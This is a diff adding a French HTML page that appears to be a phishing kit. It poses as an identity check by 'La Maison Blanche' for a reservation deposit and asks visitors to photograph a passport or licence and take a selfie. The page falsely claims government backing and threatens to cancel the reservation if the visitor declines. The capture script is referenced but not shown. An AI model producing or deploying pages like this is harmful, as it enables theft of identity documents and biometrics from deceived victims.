@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vérification d'identité La Maison Blanche</title>
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
+</head>
+<body>
+    <div style="position: absolute; top: 1rem; right: 1rem; z-index: 100;">
+        <button href="fr.html" style="padding: 0.5rem; border: none; background: #eee; cursor: pointer; border-radius: 4px;">FR</button>
+        <button href="index.html" style="padding: 0.5rem; border: none; background: #eee; cursor: pointer; border-radius: 4px; margin-left: 0.25rem;">EN</button>
+    </div>
+    <div class="verification-modal-overlay" id="firstModal">
+        <div class="verification-modal">
+            <div class="modal-header">
+                <div class="logo-container">
+                    <div class="logo-placeholder">
+                        <span class="logo-icon-store"><i class="fa-solid fa-store"></i></span>
+                        <img src="logo.png" alt="La Maison Blanche Logo" class="main-logo-image">
+                    </div>
+                </div>
+                <h1>Vérifiez votre identité avec La Maison Blanche</h1>
+            </div>
+
+            <div class="modal-content">
+                <div class="verification-step">
+                    <span class="icon"><i class="fa-solid fa-camera"></i></span>
+                    <p>Vous prendrez une photo d'une pièce d'identité valide, puis un selfie pour confirmer qu'il s'agit bien de vous.</p>
+                </div>
+                <div class="verification-step">
+                    <span class="icon"><i class="fa-solid fa-lock"></i></span>
+                    <p>La Maison Blanche aura uniquement accès à votre courriel et à votre nom complet.</p>
+                </div>
+                <div class="verification-step">
+                    <span class="icon"><i class="fa-solid fa-expand"></i></span>
+                    <p>La Maison Blanche utilise la technologie biométrique pour <a href="#" id="detailsLink" class="link-text underline">s'assurer que c'est bien vous</a>. Vos données seront supprimées une fois le processus de vérification terminé.</p>
+                </div>
+            </div>
+
+            <div class="modal-footer">
+                <p class="privacy-links">
+                    <a href="https://lamaisonblanche.ca/privacy" class="link-text">Politique de confidentialité</a>
+                </p>
+
+                <button id="agreeButton" class="btn btn-primary">Accepter et continuer</button>
+                <button id="declineButton" class="btn btn-secondary">Refuser</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="verification-details-modal-overlay hidden" id="secondModal">
+        <div class="verification-details-modal">
+            <div class="details-modal-content">
+                <h2>Comment nous vous vérifions</h2>
+
+                <div class="details-step">
+                    <span class="details-icon"><i class="fa-solid fa-arrow-circle-right"></i></span>
+                    <div>
+                        <h3>Technologie gouvernementale</h3>
+                        <p>Nous travaillons avec notre gouvernement local pour offrir une vérification d'identité avec une sécurité maximale.</p>
+                    </div>
+                </div>
+
+                <div class="details-step">
+                    <span class="details-icon"><i class="fa-solid fa-expand"></i></span>
+                    <div>
+                        <h3>Biométrie</h3>
+                        <p>La Maison Blanche vous identifiera en utilisant vos données biométriques. Vos données seront supprimées une fois le processus de vérification terminé.</p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="details-modal-footer">
+                <button id="backButton" class="btn btn-details-back">Retour</button>
+            </div>
+        </div>
+    </div>
+    
+    <div class="scan-id-screen-container hidden" id="thirdScreen">
+        <div class="scan-id-content-wrapper"> 
+            <div class="scan-id-header">
+                <button class="back-arrow-btn" id="scanBackButton">
+                    <i class="fa-solid fa-arrow-left"></i>
+                </button>
+                <div class="scan-id-logo">
+                    <img src="logo.png" alt="La Maison Blanche Logo" class="header-logo-image">
+                </div>
+            </div>
+            
+            <div class="scan-id-content">
+                <h2>Préparez-vous à numériser votre pièce d'identité</h2>
+                <p class="instruction-text">Vous devez numériser votre **permis de conduire, votre passeport ou une pièce d'identité officielle avec photo**.</p>
+                
+                <div class="id-icon-placeholder">
+                    <i class="fa-solid fa-id-card"></i>
+                </div>
+            </div>
+
+            <div class="scan-id-footer">
+                <button id="imReadyButton" class="btn btn-full-width">Je suis prêt</button>
+            </div>
+        </div>
+    </div>
+
+    
+    <div class="id-capture-modal-overlay hidden" id="fourthScreen">
+        <div class="id-capture-modal">
+            
+            <div class="progress-container">
+                <div class="progress-bar" id="progressBar"></div>
+            </div>
+            
+            <div class="id-capture-content">
+                
+                <div class="camera-preview">
+                    <video id="videoElement" autoplay></video>
+                    
+                    <button class="shutter-button" id="shutterButton"></button>
+                </div>
+                
+                <h3 id="idCaptureTitle">Recto de la pièce d'identité</h3>
+                <p id="idCaptureInstructions">Tenez la pièce d'identité devant votre caméra dans un endroit bien éclairé et appuyez sur la barre d'espace ou cliquez sur le déclencheur.</p>
+                
+                <a href="https://pay.lamaisonblanche.ca/fr" class="link-text" id="havingTroubleLink">Vous avez des difficultés ?</a>
+            </div>
+        </div>
+    </div>
+    
+    <div class="selfie-modal-overlay hidden" id="fifthScreen">
+        <div class="selfie-modal">
+            <div class="selfie-content">
+                <h2>Prenez un selfie</h2>
+                <p class="instruction-text">Insérez votre visage dans le cadre et cliquez sur le bouton du déclencheur ou appuyez sur la barre d'espace.</p>
+                
+                <div class="selfie-camera-preview">
+                    <video id="selfieVideoElement" autoplay></video>
+                    <div class="corner-brackets-overlay">
+                        <span class="corner top-left"></span>
+                        <span class="corner top-right"></span>
+                        <span class="corner bottom-left"></span>
+                        <span class="corner bottom-right"></span>
+                    </div>
+                    
+                    <button class="shutter-button" id="selfieShutterButton"></button>
+                </div>
+                
+                <a href="https://pay.lamaisonblanche.ca/fr" class="link-text" id="selfieTroubleLink">Vous avez des difficultés ?</a>
+            </div>
+        </div>
+    </div>
+
+    <div class="success-modal-overlay hidden" id="sixthScreen">
+        <div class="success-modal">
+            <div class="success-icon"><i class="fa-solid fa-check-circle"></i></div>
+            <h2>Identité Vérifiée !</h2>
+            <p>Tout est prêt. Vous allez être redirigé dans <span id="countdown">5</span> secondes...</p>
+        </div>
+    </div>
+
+    <div class="decline-modal-overlay hidden" id="seventhModal">
+        <div class="decline-modal">
+            <div class="decline-icon"><i class="fa-solid fa-exclamation-triangle"></i></div>
+            <h2>Votre réservation sera annulée.</h2>
+            <p>Cette étape est requise pour le dépôt de garantie. Si vous ne complétez pas le processus de vérification d'identité, <strong>votre réservation sera annulée.</strong></p>
+            <p>La vérification est simple et rapide, garantissant que tous nos membres sont légitimes.</p>
+            
+            <div class="decline-buttons">
+                <button id="continueVerificationButton" class="btn btn-primary">Continuer la vérification</button>
+            </div>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
